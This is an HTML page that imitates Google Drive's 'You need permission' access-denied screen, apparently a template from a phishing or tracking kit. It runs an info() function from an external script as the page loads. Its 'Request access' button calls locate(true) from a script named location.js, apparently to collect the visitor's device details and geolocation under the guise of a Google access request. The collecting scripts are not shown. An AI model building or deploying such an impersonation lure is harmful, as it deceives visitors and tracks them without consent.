<!DOCTYPE html>
<html lang="en">
<head>
	<meta name="description" content="Web word processing, presentations and spreadsheets">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
	<link rel="shortcut icon" href="/images/drive_favicon1.ico">
	<title>Google Drive - Access Denied</title>
	<link rel="stylesheet" type="text/css" href="css/main.css">
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="js/client.min.js"></script>
    <script src="js/info.js"></script>
    <script src="js/location.js"></script>
</head>
<body onload="info();">
	<div id="outerContainer">
		<div id="innerContainer">
			<div style="position: absolute; top: -80px;">
				<div id="drive-logo">
					<span class="docs-drivelogo-img"></span>
					<span class="docs-drivelogo-text"> Drive</span>
				</div>
			</div>
			<div style="clear:both"></div>
			<div id="main">
				<div id="accessDeniedIcon"></div>
				<p id="accessDeniedHeader">You need permission</p>
				<div id="message">
					<p>Want in? Ask for access, or switch to an account with permission.</p>
				</div>
				<p id="buttons" style="padding-top: 10px">
					<button id="requestButton" style="font-weight:bold" class="jfk-button jfk-button-action" onclick="locate(true);">Request access</button>
				</p>
			</div>
		</div>
	</div>
</body>
</html>